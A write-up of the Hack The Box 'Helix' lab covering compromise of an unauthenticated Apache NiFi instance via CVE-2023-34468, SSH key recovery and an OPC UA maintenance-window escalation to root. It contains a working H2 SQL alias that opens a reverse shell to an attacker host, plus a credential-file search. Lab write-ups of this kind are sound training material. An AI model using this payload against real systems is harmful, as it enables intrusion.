---
title: "Helix: Apache NiFi CVE-2023-34468, Operator-Role SSH Key, and OPC UA Maintenance Window"
description: "Unauthenticated Apache NiFi command execution through CVE-2023-34468 and an H2 database driver, a recovered operator SSH key, and a cracked operations guide open an OPC UA maintenance window that grants root."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - linux
  - apache-nifi
  - cve
  - opc-ua
---

## Summary

Helix is an HTB Medium Linux lab where an unauthenticated Apache NiFi instance exposed on a virtual host allowed command execution through CVE-2023-34468, using an H2-backed DBCP connection pool to run a remote SQL script. Local enumeration recovered a backup SSH key for the `<OPERATOR_ACCOUNT>` account. Files in the operator-role home directory revealed an internal OPC UA service and an encrypted operations guide. Cracking the PDF password provided process conditions needed to open a maintenance window, after which a privileged maintenance console granted temporary root access. Target IPs, credentials, sensitive keys, private file paths, and flags are redacted.

## Context and Objective

The recorded target was an Ubuntu Linux host exposing SSH and HTTP. The HTTP service redirected to a hostname that required virtual host enumeration. An unauthenticated Apache NiFi instance was found on a discovered subdomain. Objective: achieve initial access through the NiFi service, enumerate the local environment for escalation material, and obtain root access.

## Approach and Evidence

### Virtual host enumeration and NiFi discovery

Port scanning showed SSH and HTTP (nginx). Directory fuzzing returned no useful paths, but virtual host fuzzing identified a subdomain hosting an unauthenticated Apache NiFi instance.

```bash
gobuster vhost \
  --url http://<TARGET_HOSTNAME> \
  --wordlist /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  --append-domain
```

```text
flow.<TARGET_HOSTNAME> Status: 200 [Size: 1068]
```

The NiFi version was identified as 1.21.0, vulnerable to CVE-2023-34468.

### Command execution through NiFi CVE-2023-34468

The attack configured a `DBCPConnectionPool` controller service with an H2 database driver and URL, then created an `ExecuteSQL` processor set to run a remote SQL script. The hosted script created an H2 alias that executed a reverse shell.

```bash
python3 -m http.server <HTTP_PORT>
```

```sql
CREATE ALIAS SHELLEXEC AS $$
String shellexec(String cmd) throws java.io.IOException {
    new ProcessBuilder("bash", "-c", cmd).redirectErrorStream(true).start();
    return "started";
}
$$;

CALL SHELLEXEC('nc -c bash <ATTACKER_IP> <SHELL_PORT>');
```

```text
uid=998(<NIFI_SERVICE_ACCOUNT>) gid=998(<NIFI_SERVICE_ACCOUNT>) groups=998(<NIFI_SERVICE_ACCOUNT>)
```

### Operator SSH key recovery

NiFi configuration contained a sensitive properties key. Local file search recovered a backup SSH ed25519 key for the `<OPERATOR_ACCOUNT>` account in the NiFi support-bundles directory. The key granted SSH access and the user flag.

```bash
find / -type f \( \
  -name "*id_rsa*" -o \
  -name "*id_ed25519*" -o \
  -name "*id_ecdsa*" -o \
  -name "*.pem*" -o \
  -name "*.key*" \
) 2>/dev/null
```

```text
<NIFI_SUPPORT_DIR>/<OPERATOR_ACCOUNT>_id_ed25519.bak
```

### OPC UA maintenance window escalation

The `<OPERATOR_ACCOUNT>` home directory contained a control-system diagram showing an internal OPC UA service and a password-protected PDF operations guide. The PDF was cracked, revealing maintenance-window requirements: mode set to `MAINTENANCE`, `TestOverride` enabled, and `CalibrationOffset` increased until temperature reached approximately 295°C.

```bash
ssh -L 4840:localhost:4840 <OPERATOR_ACCOUNT>@<TARGET_HOSTNAME> -i <SSH_KEY>
```

```text
offset=11.0 temp=295.35
```

With the maintenance window open, the allowed sudo command granted a time-limited root shell (100 seconds).

```bash
sudo /usr/local/sbin/helix-maint-console
```

```text
[+] Privileged maintenance access granted
[!] Window expires in 100 seconds
<PRIVILEGED_ACCOUNT>@<TARGET_HOSTNAME>:/home/<OPERATOR_ACCOUNT>#
```

## Challenges and Decisions

The source does not record explicit obstacles, failed attempts, or tradeoffs. The NiFi exploitation required configuring controller services and processors through the web UI, then hosting the SQL script for remote execution. The OPC UA escalation followed documented process conditions from the cracked PDF guide.

## Outcome

The evidence establishes a complete attack chain from unauthenticated NiFi access through CVE-2023-34468, `<OPERATOR_ACCOUNT>` SSH key recovery, OPC UA maintenance window manipulation, and time-limited root access. All credential-bearing values are omitted.

## Lessons and Recommendations

- Internal workflow tools should require authentication and should not be internet-facing unless strictly necessary.
- CVE-2023-34468 demonstrates that controller-service configuration can be as dangerous as direct code execution when a product supports dynamic drivers and scriptable database features.
- Service support bundles can contain high-impact artifacts; review backup keys and sensitive files in support directories.
- Operational documentation can be part of a privilege escalation path. Protected guides and system diagrams reveal internal service details and process conditions.
- Time-limited sudo wrappers still represent root compromise when the permitted command grants an interactive privileged session.

## References

- Hack The Box, [Helix](https://app.hackthebox.com/machines/Helix) lab.
- CVE-2023-34468 — Apache NiFi remote code execution through H2 database driver abuse.
